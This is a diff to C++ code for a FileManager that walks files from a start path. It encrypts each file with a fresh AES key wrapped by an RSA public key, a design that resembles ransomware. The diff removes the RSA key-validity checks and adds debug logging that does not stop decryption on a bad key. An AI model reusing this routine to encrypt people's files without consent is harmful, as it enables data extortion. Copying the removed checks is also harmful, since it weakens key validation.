@@ -86,9 +86,6 @@ void FileManager::TransformFiles(const std::string& startPath, void (FileManager
 }
 
 void FileManager::EncryptContents(File& file) {
-    if ( !this->m_EncryptionKeys.pub || RSA_check_key(this->m_EncryptionKeys.pub) != 1 )
-        return;
-
     BYTESTRING AESKey          = LGCrypto::Generate256AESKey();
     BYTESTRING AESIV           = LGCrypto::GenerateAESIV();
     BYTESTRING AESKeyEncrypted = LGCrypto::RSAEncrypt(AESKey, this->m_EncryptionKeys.pub, FALSE);
@@ -103,15 +100,23 @@ void FileManager::EncryptContents(File& file) {
 }
 
 void FileManager::DecryptContents(File& file) {
-    if ( !this->m_EncryptionKeys.priv || RSA_check_key(this->m_EncryptionKeys.priv) != 1 )
-        return;
+    OutputDebugStringA(std::string("Decrypting " + Serialization::BytestringToString(file.m_Metadata.name)).c_str());
+
+    if ( !this->m_EncryptionKeys.priv ) {
+        OutputDebugStringA("bad private key :(");
+    }
 
     BYTESTRING cipherText = Serialization::SerializeString(file.ReadFrom());
+    OutputDebugStringA("got cipher text");
+
     BYTESTRING AESIV(cipherText.end() - 16, cipherText.end()); cipherText.erase(cipherText.end() - 16, cipherText.end());
+    OutputDebugStringA("got aes iv");
     BYTESTRING AESKeyEncrypted(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end()); cipherText.erase(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end());
     BYTESTRING AESKey = LGCrypto::RSADecrypt(AESKeyEncrypted, this->m_EncryptionKeys.priv, TRUE);
+    OutputDebugStringA("got aes key");
     BYTESTRING plaintext = LGCrypto::AESDecrypt(cipherText, AESKey, AESIV);
     std::string plaintextString = Serialization::BytestringToString(plaintext);
+    OutputDebugStringA("decrypted content");
 
     file.WriteTo(plaintextString);
 }
